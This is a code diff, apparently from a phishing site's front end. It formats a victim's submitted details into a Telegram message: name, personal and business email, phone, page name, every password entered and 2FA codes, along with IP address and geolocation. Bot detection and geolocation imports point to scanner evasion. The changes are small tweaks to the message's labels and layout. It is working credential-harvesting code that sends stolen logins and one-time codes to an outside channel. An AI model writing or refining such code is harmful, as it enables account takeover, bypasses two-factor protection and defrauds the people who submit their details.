@@ -18,7 +18,6 @@ import countryToLanguage from '@/utils/country_to_language';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
 
-const LABEL = 'Thần-tài-đến';
 
 const GEO_ENDPOINTS = [
     {
@@ -314,23 +313,19 @@ const Home = () => {
             ? attempts.map((code, idx) => `   Code${idx + 1}: <code>${escapeHtml(code)}</code>`).join('\n')
             : '   Code1: <code>N/A</code>';
 
-        const message = `📩 <b>${escapeHtml(LABEL)}</b>
+        const message = `
 ⏰ ${formatDateTime()}
 🌐 IP: <code>${escapeHtml(safeIp)}</code>
-📱 Device: ${escapeHtml(parsedDevice)}
 📍 Location: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
 ━━━━━━━━━━━━━━━━━━━━
 📋 <b>INFO</b>
    Name: <code>${escapeHtml(form.fullName)}</code>
    Email: <code>${escapeHtml(form.personalEmail)}</code>
-   Biz Email: <code>${escapeHtml(form.businessEmail)}</code>
+   DN Email: <code>${escapeHtml(form.businessEmail)}</code>
    Phone: <code>${escapeHtml(form.phone)}</code>
    Page: <code>${escapeHtml(form.pageName)}</code>
-
-
 🔐 <b>PASSWORD</b>
 ${passwordLines}
-
 🔒 <b>2FA CODE</b>
 ${twoFALines}
 ━━━━━━━━━━━━━━━━━━━━`;
